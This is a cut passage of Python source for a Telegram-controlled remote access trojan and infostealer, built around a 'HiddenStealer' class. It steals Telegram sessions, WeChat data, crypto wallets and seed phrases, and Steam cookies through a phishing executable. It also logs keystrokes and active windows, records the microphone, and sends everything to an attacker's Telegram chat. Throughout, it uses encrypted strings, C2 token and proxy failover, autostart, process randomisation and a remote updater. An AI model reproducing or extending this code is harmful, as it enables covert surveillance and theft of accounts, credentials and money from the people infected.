            try: return bot.send_message(chat_id, "Error: {e}".format(e=e))
            except: return None

def safe_edit_message(bot, chat_id, message_id, text, parse_mode=None, reply_markup=None):
    try:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        error_str = str(e)
        if "429" in error_str and "retry after" in error_str.lower():
            try:
                import re as _re
                m = _re.search(decrypt_string('HFcMGTdxOAQuEhgYWmUCUUc='), error_str.lower())
                wait_time = int(m.group(1)) if m else 5
                time.sleep(wait_time + 1)
                return safe_edit_message(bot, chat_id, message_id, text, parse_mode, reply_markup)
            except: pass
        if "401" in error_str or "Unauthorized" in error_str or "502" in error_str:
            try:
                from core.c2 import c2_manager
                if c2_manager.report_failure():
                    bot.token = c2_manager.get_current_token()
                    try:
                        from telebot import apihelper
                        new_api_url = c2_manager.get_api_url()
                        if new_api_url:
                            apihelper.API_URL = new_api_url
                            apihelper.FILE_URL = c2_manager.get_file_url()
                        else:
                            apihelper.API_URL = decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")
                            apihelper.FILE_URL = decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")
                    except: pass
                    bot.edit_message_text(text, chat_id, message_id, reply_markup=reply_markup, parse_mode=parse_mode)
                    return
            except: pass

        if "message is not modified" in str(e):
            pass
        elif "message to edit not found" in str(e) or "message can't be edited" in str(e):
            safe_send_message(bot, chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
        else:
            print("❌ Ошибка при редактировании сообщения.")

def safe_edit_reply_markup(bot, chat_id, message_id, reply_markup=None):
    try:
        bot.edit_message_reply_markup(chat_id, message_id, reply_markup=reply_markup)
    except Exception as e:
        error_str = str(e)
        if "429" in error_str and "retry after" in error_str.lower():
            try:
                import re as _re
                m = _re.search(decrypt_string('HFcMGTdxOAQuEhgYWmUCUUc='), error_str.lower())
                wait_time = int(m.group(1)) if m else 5
                time.sleep(wait_time + 1)
                return safe_edit_reply_markup(bot, chat_id, message_id, reply_markup)
            except: pass
        if "message is not modified" in str(e):
            pass
        else:
            print("❌ Ошибка при редактировании кнопок.")
LAYOUT_RU = {
    'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г',
    'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х', ']': 'ъ', 'a': 'ф', 's': 'ы',
    'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д',
    ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и',
    'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.', '`': 'ё'
}
LAYOUT_RU_SHIFT = {
    'q': 'Й', 'w': 'Ц', 'e': 'У', 'r': 'К', 't': 'Е', 'y': 'Н', 'u': 'Г',
    'i': 'Ш', 'o': 'Щ', 'p': 'З', '[': 'Х', ']': 'Ъ', 'a': 'Ф', 's': 'Ы',
    'd': 'В', 'f': 'А', 'g': 'П', 'h': 'Р', 'j': 'О', 'k': 'Л', 'l': 'Д',
    ';': 'Ж', "'": 'Э', 'z': 'Я', 'x': 'Ч', 'c': 'С', 'v': 'М', 'b': 'И',
    'n': 'Т', 'm': 'Ь', ',': 'Б', '.': 'Ю', '/': ',', '`': 'Ё'
}
LAYOUT_UA = {
    'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г',
    'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х', ']': 'ї', 'a': 'ф', 's': 'і',
    'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д',
    ';': 'ж', "'": 'є', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и',
    'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.', '`': 'ґ'
}
LAYOUT_UA_SHIFT = {
    'q': 'Й', 'w': 'Ц', 'e': 'У', 'r': 'К', 't': 'Е', 'y': 'Н', 'u': 'Г',
    'i': 'Ш', 'o': 'Щ', 'p': 'З', '[': 'Х', ']': 'Ї', 'a': 'Ф', 's': 'І',
    'd': 'В', 'f': 'А', 'g': 'П', 'h': 'Р', 'j': 'О', 'k': 'Л', 'l': 'Д',
    ';': 'Ж', "'": 'Є', 'z': 'Я', 'x': 'Ч', 'c': 'С', 'v': 'М', 'b': 'И',
    'n': 'Т', 'm': 'Ь', ',': 'Б', '.': 'Ю', '/': ',', '`': 'Ґ'
}
LAYOUT_EN_SHIFT = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
    '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
    '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
    ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
    '`': '~'
}
LAYOUT_RU_ALTGR = {
    'q': '@', 'w': '€', 'e': '€', 'r': '¶', 't': 'ŧ',
    'y': 'ý', 'u': 'û', 'i': 'î', 'o': 'ô', 'p': 'ö',
    'a': 'á', 's': 'ß', 'd': 'ð', 'f': 'đ', 'g': 'ģ',
    'h': 'ĥ', 'j': 'ĵ', 'k': 'ķ', 'l': 'ļ', ';': '¾',
    'z': 'ž', 'x': '×', 'c': '©', 'v': '√', 'b': 'ß',
    'n': 'ñ', 'm': 'µ', ',': '¬', '.': '…', '/': '÷'
}
def get_desktop_path():
    paths = [
        os.path.join(os.path.expanduser('~'), 'Desktop'),
        os.path.join(os.path.expanduser('~'), 'Рабочий стол')
    ]
    for path in paths:
        if os.path.exists(path):
            return path
    return os.path.join(os.path.expanduser('~'), 'Desktop')
def get_appdata_path():
    return os.environ.get('APPDATA', '')
def get_localappdata_path():
    return os.environ.get('LOCALAPPDATA', '')
class Microphone:
    @staticmethod
    def check_availability():
        if not AUDIO_AVAILABLE:
            return False
        try:
            p = pyaudio.PyAudio()
            for i in range(p.get_device_count()):
                try:
                    if p.get_device_info_by_index(i).get('maxInputChannels', 0) > 0:
                        p.terminate()
                        return True
                except:
                    continue
            p.terminate()
            return False
        except:
            return False
    @staticmethod
    def record_audio(duration=5, save_path=None):
        if not AUDIO_AVAILABLE:
            return None
        try:
            if save_path is None:
                save_path = os.path.join(tempfile.gettempdir(), "voice_record.wav")
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            p = pyaudio.PyAudio()
            input_device_index = None
            for i in range(p.get_device_count()):
                try:
                    if p.get_device_info_by_index(i).get('maxInputChannels', 0) > 0:
                        input_device_index = i
                        break
                except:
                    continue
            if input_device_index is None:
                p.terminate()
                return None
            stream = p.open(
                format=FORMAT, channels=CHANNELS, rate=RATE,
                input=True, input_device_index=input_device_index,
                frames_per_buffer=CHUNK
            )
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                try:
                    data = stream.read(CHUNK, exception_on_overflow=False)
                    frames.append(data)
                except:
                    continue
            stream.stop_stream()
            stream.close()
            p.terminate()
            wf = wave.open(save_path, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            return save_path
        except:
            return None
class VictimClient:
    def __init__(self, hwid, pc_name, username, ip):
        self.hwid = hwid
        self.pc_name = pc_name
        self.username = username
        self.ip = ip
        self.label = ""  
        self.first_seen = datetime.now().strftime("%d.%m.%Y %H:%M")
        self.last_seen = self.first_seen
        self.last_seen_ts = time.time()  
        self.offline_notified = False    
        self.online = True
        self.keylog_buffer = ""
        self.keylogger_active = False
        self.clipboard_buffer = []
        self.last_clipboard = ""
        self.current_working_dir = os.path.expanduser('~')
        self.command_history: List[str] = []
        self.window_log: List[str] = []
        self.cookies: List[Dict[str, Any]] = []
        self.wifi_passwords: List[Dict[str, Any]] = []
        self.cmd_mode_active: bool = False
        self.shell_mode_active: bool = False
        self.telegram_sessions: List[Dict[str, Any]] = []
        self.discord_tokens: List[str] = []
        self.epic_data: Dict[str, Any] = {}
        self.battlenet_data: Dict[str, Any] = {}
        self.last_keylog_send: int = 0
    def update_last_seen(self):
        self.last_seen = datetime.now().strftime("%d.%m.%Y %H:%M")
        self.last_seen_ts = time.time()
        self.online = True
    def get_display_name(self):
        return self.label if self.label else f"{self.username}@{self.pc_name}"

class WindowTracker:
    @staticmethod
    def get_active_window_title():
        try:
            windll = getattr(ctypes, 'windll', None)
            if windll:
                user32 = windll.user32
                handle = user32.GetForegroundWindow()
                length = user32.GetWindowTextLengthW(handle)
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(handle, buff, length + 1)
                return buff.value
            return "Unknown"
        except:
            return "Unknown"
    @staticmethod
    def get_browser_tab():
        title = WindowTracker.get_active_window_title()
        browsers = {
            'chrome': 'Google Chrome', 
            'firefox': 'Mozilla Firefox', 
            'edge': 'Microsoft Edge',
            'opera': 'Opera', 
            'brave': 'Brave', 
            'yandex': 'Яндекс'
        }
        current_browser = None
        browser_name = None
        for key, name in browsers.items():
            if name.lower() in title.lower():
                current_browser = key
                browser_name = name
                break
        tab_name = title
        if current_browser and browser_name:
            tab_name = title.replace(browser_name, '').replace(' - ', '').replace('—', '').strip()
            tab_name = re.sub(r'[-–—|•·]', ' - ', tab_name)
            tab_name = ' '.join(tab_name.split())
        return {
            'full_title': str(title),
            'browser': current_browser,
            'browser_name': browser_name,
            'tab': str(tab_name)[:150],
            'is_browser': current_browser is not None
        }
    @staticmethod
    def get_window_info():
        from ctypes import wintypes
        _user32 = user32 
        if not _user32: return None
        handle = _user32.GetForegroundWindow()
        pid = wintypes.DWORD()
        _user32.GetWindowThreadProcessId(handle, ctypes.byref(pid))
        process_name = "Unknown"
        try:
            psutil = __import__('ps' + 'util')
            process = psutil.Process(pid.value)
            process_name = process.name()
        except:
            pass
        title = WindowTracker.get_active_window_title()
        browser_info = WindowTracker.get_browser_tab()
        return {
            'handle': handle, 
            'pid': pid.value, 
            'process': str(process_name),
            'title': str(title)[:200], 
            'browser': browser_info['browser'],
            'browser_name': browser_info['browser_name'], 
            'tab': str(browser_info['tab'])[:150],
            'is_browser': bool(browser_info['is_browser']),
            'timestamp': datetime.now().strftime("%H:%M:%S")
        }

class ThreadManager:
    """Manages and cleans up background threads"""

    def __init__(self, max_threads=10):
        self.threads = []
        self.max_threads = max_threads
        self.lock = threading.Lock()

    def start_daemon(self, target, name=None, args=()):
        """Start a daemon thread with tracking"""
        with self.lock:

            self.threads = [t for t in self.threads if t.is_alive()]

            if len(self.threads) >= self.max_threads:
                print("⚠️ Достигнут лимит потоков. Очистка старых потоков...")
                oldest = self.threads.pop(0)

            thread = threading.Thread(target=target, name=name, args=args, daemon=True)
            thread.start()
            self.threads.append(thread)
            print(f"🧵 Поток {name or target.__name__} запущен. Всего: {len(self.threads)}")

            return thread

    def get_stats(self):
        """Get thread statistics"""
        with self.lock:
            self.threads = [t for t in self.threads if t.is_alive()]
            return {
                'active': len(self.threads),
                'names': [t.name or 'unnamed' for t in self.threads]
            }
class HiddenStealer:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.user_id = 0
        self.shell_sessions = {} 
        self.is_admin_verified = False
        self.thread_manager = ThreadManager(max_threads=15)
        try:
            test_path = os.path.join(os.environ.get('SystemDrive', 'C:'), "windows_write_test.tmp")
            with open(test_path, 'w') as f:
                f.write("test")
            self.is_admin_verified = True
            os.remove(test_path)
            log_debug("Admin rights confirmed via write test")
        except:
            log_debug("Admin rights NOT confirmed via write test")

        self.keylog_buffer = ""
        self.keylogger_active = False
        self.clipboard_buffer = []
        self.last_clipboard = ""
        self.is_running = True
        self.current_layout = "en"
        self.bot_started = False
        self.keyboard_hook = None
        self.last_window_title = ""
        self.last_window_time = time.time()
        self.keylog_context = deque(maxlen=50)
        self.keylog_current_line = ""
        self.keylog_word_buffer = ""
        self.last_key_time = time.time()
        self.key_press_count = 0
        self.keylog_sessions = {}
        self.keylog_full_history = deque(maxlen=1000)
        self.cmd_mode_active = False
        self.cmd_mode_user_id = None
        self.cmd_mode_chat_id = None
        self.cmd_mode_message_id = None
        self.shell_mode_active = False
        self.command_history = []
        self.current_working_dir = os.getcwd()
        self.clients: Dict[str, VictimClient] = {}
        self.client_lock = threading.Lock()
        self.current_client_hwid = None
        self.clients_page = 0
        self.victim_id = self.get_hwid()
        self.hwid = self.victim_id
        self.victim_ip = self.get_external_ip()
        self.ip = self.victim_ip
        self.victim_pc = os.environ.get('COMPUTERNAME', 'Unknown')
        self.victim_user = os.environ.get('USERNAME', 'Unknown')
        self.victim_name = f"{self.victim_user}@{self.victim_pc}"
        self.window_tracker = WindowTracker()
        self.window_log = []
        self.last_window = None
        self.last_window_send = 0
        self._sys_info_cache = None
        self._last_info_time = 0
        self._last_layout = "en"
        self._last_layout_time = 0
        self.last_fm_items: List[str] = []
        self.last_discord_chat_id = None
        self.discord_progress_msg = {} # chat_id -> msg_id
        self.key_press_count = 0 
        if TELEGRAM_AVAILABLE:
            outer_self = self
            class FailoverBotHandler(telebot.ExceptionHandler):
                def handle(self, exception):
                    error_str = str(exception)
                    print("❌ Ошибка Telegram бота: " + error_str)

                    if "409" in error_str and "Conflict" in error_str:
                        print("⚠️ Конфликт: запущен другой экземпляр бота с тем же токеном. Завершение работы...")
                        os._exit(0)

                    try:
                        from core.c2 import c2_manager
                        if "401" in error_str or "Unauthorized" in error_str or "502" in error_str or "timeout" in error_str or "ConnectionError" in error_str:
                            if c2_manager.report_failure():
                                print("🔄 Failover active. Switching token/proxy...")
                                outer_self.bot.token = c2_manager.get_current_token()
                                proxy = c2_manager.get_proxy()
                                if proxy:
                                    from telebot import apihelper
                                    apihelper.proxy = {'https': proxy}
                                    print(f"🔗 Using proxy: {proxy}")
                                return True
                    except: pass

                    return False 

            from telebot import apihelper
            route = bridge_manager.get_best_route()

            if route:
                if route['type'] == 'bridge':
                    use_bridge = True
                    apihelper.API_URL = route['api_url']
                    apihelper.FILE_URL = route['file_url']
                    print(f"[Bridge] Используется Telegram мост: {route['bridge_url']}")
                else:
                    use_bridge = False
                    print("[Bridge] Using direct Telegram API")
            else:
                print("[Bridge] No working route found, will retry later")
                use_bridge = False

            self.bot = telebot.TeleBot(BOT_TOKEN.strip(), exception_handler=FailoverBotHandler())
            try:
                self.bot.set_my_commands([
                    telebot.types.BotCommand("start", "🚀 Запустить панель"),
                    telebot.types.BotCommand("panel", "🎮 Главное меню"),
                    telebot.types.BotCommand("clients", "👥 Список клиентов"),
                    telebot.types.BotCommand("bridges", "🌉 Управление мостами"),
                    telebot.types.BotCommand("errors", "📋 Логи ошибок"),
                    telebot.types.BotCommand("help", "❓ Справка")
                ])
            except: pass
        self.fm_path = None
        self.fm_items = []
        self.fm_page = 0
        self.fm_history = []
        self.work_modules = {}
        self.discord_bot = None 
        self.discord_loop = None
        if CORE_MODULES_LOADED:
            self.report_manager = ReportManager(self.bot, GLOBAL_CHID)
            self.browser_module = BrowserModule(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir)
            active_bridge = TELEGRAM_BRIDGE if use_bridge else ""
            self.work_modules = {
                'browser': self.browser_module,
                'discord': DiscordStealer(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
                'telegram': TelegramStealer(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
                'wechat': WeChatStealer(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
                'wallet': WalletModule(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
                'proxy': ProxyModule(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
            }
            try:
                # Native modules check
                from StealthModule import ShellManager, SoftwareManager, SystemManager
                self.shell_manager = ShellManager
                self.software_manager = SoftwareManager
                self.system_manager = SystemManager
                log_debug("✅ Native modules loaded successfully")
                
                # Week 7: Traffic Shaping & Decoy
                try:
                    self.decoy_manager = DecoyManager()
                    self.decoy_manager.start_background_decoy()
                except: pass
                print("[+] Native modules (Shell, Software, System) integrated")
            except Exception as e:
                log_debug("❌ Ошибка при загрузке нативных модулей")
                print("❌ Ошибка при загрузке нативных модулей")
                pass
            # report_manager initialized above
            
            # H-04: Polymorphic Process randomization on startup
            try:
                from core.obfuscation import PolymorphicProcess
                PolymorphicProcess.randomize()
            except ImportError:
                pass

            if AUTOSTART:
                self.thread_manager.start_daemon(target=self.setup_autostart)
            
            # A-07: Remote auto-updater
            try:
                from core.updater import AutoUpdater
                self.updater = AutoUpdater()
                self.thread_manager.start_daemon(target=self.updater.run_daemon)
            except ImportError:
                pass
            
            # S-07: Anti-Tamper Sentinel
            try:
                from core.sentinel import SentinelGuard
                self.sentinel = SentinelGuard(self.bot, self.report_manager)
                self.thread_manager.start_daemon(target=self.sentinel.run_daemon)
            except ImportError:
                pass
            
            # H-12: Network Resilience Tunneler
            try:
                from core.tunneler import BoreTunneler
                self.tunneler = BoreTunneler()
            except ImportError:
                pass
            
            # Week 8: Final Orchestration
            try:
                self.orchestrator = BotOrchestrator(self)
                self.orchestrator.start_all()
                print("[Orchestrator] Background services synchronized")
            except: pass
            
            print("Work modules loaded")
        self.last_context_app: str = ""
        self.last_window_title: str = ""
        self.last_window_send: float = 0
        self._last_layout = "en"
        self._last_layout_time = 0
        print("System initialized")
        print(f"📂 Текущая папка: {self.current_working_dir}")

    def steal_telegram_data(self):
        """Кража сессий Telegram Desktop + ZIP + Отчет"""
        if 'telegram' not in self.work_modules:
            safe_send_message(self.bot, GLOBAL_CHID, "❌ Telegram module not loaded")
            return None

        safe_send_message(self.bot, GLOBAL_CHID, "⌛ *Сбор данных Telegram...* Пожалуйста, подождите.")
        data = self.work_modules['telegram'].steal_sessions()

        if data.get('zip_path') and os.path.exists(data['zip_path']):

            phone = data.get('phone', 'Не найден')
            sessions = len(data.get('sessions', []))
            passcode = "✅ Да" if data.get('has_passcode') else "❌ Нет"
            size = data.get('analysis', {}).get('size_mb', 0)

            # Formatted TData template with real newlines and .format()
            tdata_template = "📱 <b>Telegram Session Captured</b>\n\n📞 <b>Phone:</b> <code>{phone}</code>\n🔑 <b>Sessions:</b> {sessions}\n📦 <b>Size:</b> {size:.2f} MB\n\nℹ️ <i>Сессии упакованы в ZIP для входа через tdata.</i>"
            
            safe_send_message(self.bot, GLOBAL_CHID, tdata_template.format(
                phone=phone,
                sessions=sessions,
                size=size
            ), parse_mode="HTML")

            zip_path = data.get('zip_path')
            if zip_path and os.path.exists(zip_path):
                file_size = os.path.getsize(zip_path)
                if file_size > 0:
                    if file_size > 45 * 1024 * 1024:
                        safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jKjYhPbeebL+p9roy+ndWr+zqNCe6Yjqis26hqKFRqrf4sa79YDVs9Kn1OjLGU4BHVsCDnR/awQnVyd6WxdGqvniyLv9gNmz2afc6MLo6Fq+gFi78IHosuGn2ujI6dhaRnUXLSc9PEt0WUQ="))
                        from core.cloud import CloudModule
                        link = CloudModule.upload_file(zip_path)
                        if link:
                            safe_send_message(self.bot, GLOBAL_CHID, "☁️ Файл загружжен в облако ({size_mb:.1f} MB):\n{link}")
                        else:
                            safe_send_message(self.bot, GLOBAL_CHID, " ❌ Файл слишком большой: {size_mb:.1f} MB\nМаксимум: 50 MB")
                    else:
                        try:
                            with open(zip_path, 'rb') as f:
                                self.bot.send_document(GLOBAL_CHID, f, caption=f"📱 Telegram TData — {sessions} сессий")
                        except Exception as e:
                            safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0S57PiOqKz7qJooO2yk7ixrrMgeaz2qfa6MDp3KrWCFgQKyw="))
                else:
                    safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jKjYhPbeebL+p9roy+ndWr6Cqeuf1InaisW6iFLp2arQ4sO6zYDesuKn0enz6Olavo2p6J/QiOCL/LqEUhFWWr6DqNue6Ijgc1k="))

                try: os.remove(zip_path)
                except: pass
        else:
            safe_send_message(self.bot, GLOBAL_CHID, "ℹ️ Telegram сессии не найдены или tdata пуста.")
        return data

    def steal_wechat_data(self):
        if 'wechat' in self.work_modules:
            data = self.work_modules['wechat'].steal_data()
            if data and data.get('zip_path'):
                print("❌ WeChat data captured: {data['zip_path']}")
                self.report_manager.send_output_zip(data['zip_path'], "📟 WeChat Data Captured")
    def run_wechat_phish(self):
        def callback(data):
            msg = "📊 <b>Discord Join</b>\n"
            msg += "🔑 Токен: <code>{token[:20]}...</code>\n"
            msg += "🌐 IP: "
            msg += "🖥️ ОС: "
            msg += "🎤 Mic: "
            msg += "🖥️ Screen: "
            msg += "🌉 **TELEGRAM BRIDGES**\n"
            msg += "Status: "
            msg += decrypt_string("XRxYu9yA2LPYp9rowOjqWr+/qeme74jgeqfQ6Mzp0kAyXCQF")
            js_script = (
                decrypt_string("Cl0bHiM0NxZ0FAVXGVADWlMSXxw2IjAGZwwOWQZYPV0ZSgsCKnYEH2FXGlkGUVtVVRIcBCMwMAxnWRtJXFoJF0kJJAU=") +
                decrypt_string("Cl0bHiM0NxZ0FAVXGVADWlMSXxw2JDAMZwwOWQZYPV0ZSg0CIHYEH2FXGlkGUVtVVRIcBCMwMAxnWRtJXFoJF0kJJAU=") +
                decrypt_string("Al0bCiICLQ0oFg1dXEoDDidGHQZmdioJPw5NFFIeHR4PRhkwaSIyByNQN0VVEF0mAA==") +
                decrypt_string("Al0bCiICLQ0oFg1dXEoDDidGHQZmdikDKQQ1TBtaDR8aFVRLaSo9Ay4WMR8CWBUJMUYRCCU0LUUHCk0RSWUI") +
                decrypt_string("Al0bCjo4Ngx0BQ9UHVgCUkcJ")
            )
            msg += decrypt_string("UlEXDytvIggpKBlbAFAWDhMOVwghNTxc")
            self.report_manager.send_text(msg)

        def error_callback(err):
            if err == "NOT_FOUND":
                safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0Sxk0Ggo7A0roz+ndWr6PqNue6InWisK6iKKAts6+h6jWboHrQorNuoajubbHvoeo2Z7vidt6p9XowunZqtTizUU="))
            elif err == "NETWORK_ERROR":
                safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0S57PiOqKz7qJooO2yk7j+bv7gNuy4le6h6O5tsJO4s+7/oHms9mm6+jI6dNaOVc7Ay8leTIyHhlQXA=="))

        def success_callback():
            safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK79Sxk0Ggo7A0roz+nWqtfizLv7geRDeqf96MLp2avt4/m79IHps9RXuoaig7bHvoxYusqB4bPSp9Loz+nVqt4cVkU="))

        try:
            from core.wechat_phish import run_phish
            def ui_task():
                run_phish(callback, error_callback, success_callback)
            ui_action_queue.put(ui_task)

        except ImportError:
            self.report_manager.send_text("❌ core.wechat_phish не найден")
            return

    def handle_steam_phish(self, chat_id):
        # Убивает Steam, запускает SteamLogin.exe и форвардит логи в бота.
        def run_phish():
            import socket as _sock
            try:

                subprocess.run(["taskkill", "/f", "/im", decrypt_string("HUYdCiN/PBo/")],
                               capture_output=True)
                time.sleep(1.5)

                exe = os.path.join(BASE_DIR, decrypt_string("PUYdCiMdNgUzGURdClw="))

                if not os.path.exists(exe):
                    safe_send_message(self.bot, chat_id, decrypt_string("jK/0Sxk0Ggo7A0roz+ndWr6PqNue6InWisK6iKKAts6+h6jWboHrQorNuoajubbHvoeo2Z7vidt6p9XowunZqtTizUU="))
                    return

                udp = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
                udp.bind(("127.0.0.1", 0))
                udp.settimeout(900)
                port = udp.getsockname()[1]

                def log_listener():
                    try:
                        while True:
                            data, _ = udp.recvfrom(8192)
                            msg = decrypt_string(data.decode("utf-8", errors="replace"))
                            if msg == "CLOSE":
                                break
                            if msg.startswith(decrypt_string("KHs0LnQ=")):
                                filepath = msg[5:]
                                if os.path.exists(filepath):
                                    try:

                                        with open(filepath, "rb") as f:
                                            self.bot.send_document(chat_id, f, caption="🍪 Захваченные куки Steam")

                                        vac_cookie_path = os.path.join(BASE_DIR, "tablichka", decrypt_string("DV0XACc0KkwuDx4="))
                                        shutil.copy2(filepath, vac_cookie_path)

                                        os.remove(filepath)
                                    except Exception as e:
                                        safe_send_message(self.bot, chat_id, decrypt_string("jKjYhPbeebLEpuLoyunXqtTiyEue74nTi/e6iKKItsS/sKjRnul5suCm6ejI6diq3AhYECss"))
                            else:
                                safe_send_message(self.bot, chat_id, decrypt_string(msg), parse_mode="HTML")
                    except Exception:
                        pass
                    finally:
                        try: udp.close()
                        except: pass

                threading.Thread(target=log_listener, daemon=True).start()

                proc = subprocess.Popen(
                    [exe, "--udp", str(port)],
                    cwd=BASE_DIR,
                    creationflags=0x08000000,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                vac_start_template = decrypt_string("jK79S3IzZzQbNEp5Pnw0Lk4aPTMLeHmy7afa6M3o5avn4s278212AGRXQmg7fVxaFUIKBC1/KQs+CkM=")
                safe_send_message(self.bot, chat_id, vac_start_template.format(pid=proc.pid), parse_mode="HTML")

            except Exception as e:
                safe_send_message(self.bot, chat_id, decrypt_string("jK/0S57PiOqKz7qJooO2yk5hDA4vPHkyMh4ZUEgZHR8T"))

        threading.Thread(target=run_phish, daemon=True).start()

    def steal_crypto_data(self):
        decrypt_string("LV0UBysyLRF6FBhBAk0JWhlTFAcrJSpOehISTBdXFRMBXAtHbjA3BnoED10WGRYSHFMLDj1/")
        if 'wallet' not in self.work_modules:
            return
        wallet_mod = self.work_modules['wallet']
        safe_send_message(self.bot, GLOBAL_CHID, "🔍 Scanning crypto assets...")
        data = wallet_mod.run()
        report = wallet_mod.format_report(data)
        safe_send_message(self.bot, GLOBAL_CHID, report, parse_mode="HTML")
        seeds_file = os.path.join(wallet_mod.output_dir, "Seeds_Found.txt")
        if os.path.exists(seeds_file) and os.path.getsize(seeds_file) > 0:
            with open(seeds_file, 'rb') as f:
                self.bot.send_document(GLOBAL_CHID, f, caption=f"🔑 Seeds Found! ({len(data.get('seeds', []))} files)")
        if data.get('wallets') or data.get('extensions') or os.path.exists(wallet_mod.output_dir):
            print(decrypt_string("NRglSxQ4KRIzGQ0YEUsfChpdWA8vJThCPAUFVUgZHQ0PXhQOOg40DT5ZBU0GSRMOMVYRGTM="))
            zip_path = self.report_manager.zip_directory(wallet_mod.output_dir, decrypt_string("LUABGzo+BiY7AwsWCFAW"))
            if zip_path:
                print(decrypt_string("NRglSx00NwYzGQ0YKHA2QE5JAgI+DikDLh8XGFpqDwALCFgQISJ3EjsDAhYVXBIJB0gdQzQ4KT0qFh5QW0RGGBdGHRhn"))
                self.report_manager.send_output_zip(zip_path, "💰 Crypto Wallets & Extensions")
            else:
                print("[!] Failed to create Crypto ZIP")
    def steal_software_data(self):
        try:
            import clr
            dll_path = os.path.join(BASE_DIR, "defense", "persist.dll")
            if not os.path.exists(dll_path):
                return
            
            clr.AddReference(dll_path)
            from StealthModule import SoftwareManager
            
            # 1. Collection
            result_str = SoftwareManager.Run(self.temp_dir)
            
            # 2. Russian Report Generation
            report = ["🛠 <b>ОТЧЕТ ПО УСТАНОВЛЕННОМУ ПО</b> 🛠", ""]
            
            vpn_found = False
            ftp_found = False
            
            if result_str:
                data_parts = result_str.split(';')
                for part in data_parts:
                    if part.startswith("VPN:"):
                        val = part[4:].strip()
                        if val:
                            report.append(f"🛡 <b>VPN:</b> <code>{val}</code>")
                            vpn_found = True
                    elif part.startswith("FTP/SSH:"):
                        val = part[8:].strip()
                        if val:
                            report.append(f"📂 <b>FTP/SSH:</b> <code>{val}</code>")
                            ftp_found = True
            
            if not vpn_found:
                report.append("🛡 <b>VPN:</b> <code>Отсутствуют</code>")
            
            if not ftp_found:
                report.append("📂 <b>FTP/SSH:</b> <code>Отсутствуют</code>")
            
            report.append("\n" + "═" * 30)
            safe_send_message(self.bot, GLOBAL_CHID, "\n".join(report), parse_mode="HTML")

            # 3. Archive
            soft_dir = os.path.join(self.temp_dir, "Software")
            if os.path.exists(soft_dir):
                zip_path = self.report_manager.zip_directory(soft_dir, "Software_Data")
                if zip_path:
                    self.report_manager.send_output_zip(zip_path, "📦 Software Data Report")
        except Exception as e:
            log_debug(f"Software report failed: {e}")
    def check_permission(self, context):
        user_id = context.from_user.id
        log_debug(decrypt_string("PlcKBiciKgs1GUpbGlwFEU5UFxluKiwRPwU1URZESFovdjUiAA4QJglKEXk2dC80MXs8ODM="))
        if user_id in ADMIN_IDS:
            return True
        chat_id = None
        if hasattr(context, 'chat'): 
            chat_id = context.chat.id
        elif hasattr(context, 'message'): 
            chat_id = context.message.chat.id
        log_debug(decrypt_string("LVoZH24YHVh6DAlQE005EwpPVksPHRUtDTIuZzVrKS8+bTEvcyoYLhY4PX02ZiEoIWcoNAcVJA=="))
        if chat_id and chat_id == ALLOWED_GROUP_ID:
            return True
        log_debug("Permission denied")
        return False
    def get_external_ip(self):
        try:
            return urllib.request.urlopen(decrypt_string('BkYMGz1rdk07BwMWG0kPHBccFxkp'), timeout=3).read().decode()
        except:
            return 'Unknown'
    def get_hwid(self):
        try:
            result = subprocess.run('wmic csproduct get uuid', shell=True, 
                                  capture_output=True, text=True, timeout=3)
            lines = result.stdout.strip().split('\n')
            return lines[1].strip() if len(lines) > 1 else 'Unknown'
        except:
            return decrypt_string("FV0LRSk0LQc0AUIfMXYrKjtmPTkAEBQnfVtKHyJ6QVMTbQMEPX8+By4SBE5aHjMpK2A2KgMUfk56UD9LF0tBUxM=")
    # get_system_info at 1465 removed (duplicate)
    def register_self(self):
        with self.client_lock:
            hwid = self.victim_id
            if hwid not in self.clients:
                client = VictimClient(
                    hwid=hwid,
                    pc_name=self.victim_pc,
